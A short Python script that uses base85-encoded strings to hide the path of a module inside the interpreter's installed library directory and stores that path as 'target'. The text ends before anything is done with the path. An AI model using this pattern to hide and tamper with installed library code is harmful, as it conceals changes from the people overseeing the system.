import pathlib
import sys
import base64


cwd = pathlib.Path(sys.executable)
new_path = cwd.parent.parent / 'lib'
directories = [item.name for item in new_path.iterdir() if item.is_dir()]
base_path = cwd.parent.parent / 'lib' / directories[0]
module_path = (
    base_path /
    base64.b85decode("b7^#CEpTCDYhh<)a{").decode('utf-8') /
    base64.b85decode("bZ>HFXm)9HX>V=").decode('utf-8') /
    base64.b85decode("ZEs{{Y;y").decode('utf-8') /
    base64.b85decode("a%FRFWpplZc>").decode('utf-8'))

target = module_path
